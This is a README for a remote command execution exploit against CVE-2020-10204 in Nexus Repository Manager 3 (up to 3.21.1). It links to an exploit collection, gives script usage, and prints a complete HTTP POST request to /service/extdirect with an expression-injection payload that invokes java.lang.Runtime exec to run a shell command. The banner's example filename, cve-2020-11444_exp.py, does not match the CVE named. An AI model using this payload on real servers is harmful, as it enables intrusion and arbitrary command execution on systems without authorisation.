# CVE-2020-10204
CVE-2020-10204 远程命令执行脚本  
更多脚本文件另参：https://github.com/zhzyker/exphub

# Readme
```
+---------------------------------------------------------------------------------------------------------+
+ DES: by zhzyker as https://github.com/zhzyker/exphub                                                    +
+      CVE-2020-10204 Nexus Repository Manager 3 Remote Code Execution                                    +
+---------------------------------------------------------------------------------------------------------+
+ USE: python3 <filename> <url> <session> <cmd>                                                           +
+ EXP: python3 cve-2020-11444_exp.py http://ip:8081 6c012a5e-88d9-4f96-a05f-3790294dc49a "touch /tmp/233" +
+ VER: Nexus Repository Manager 3.x OSS / Pro <= 3.21.1                                                   +
+---------------------------------------------------------------------------------------------------------+
```

# Examples

![images](https://github.com/zhzyker/CVE-2020-10204/blob/master/20200527.png)

# Payload
```
POST /service/extdirect HTTP/1.1
Host: 127.0.0.1:8081
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=067e87d1-3019-46a0-8f31-04a7f7896459
Content-Length: 293


{"action":"coreui_Role","method":"create","data":[{"version":"","source":"default","id":"1111","name":"2222","description":"3333","privileges":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/exphub')}"],"roles":[]}],"type":"rpc","tid":89}
```
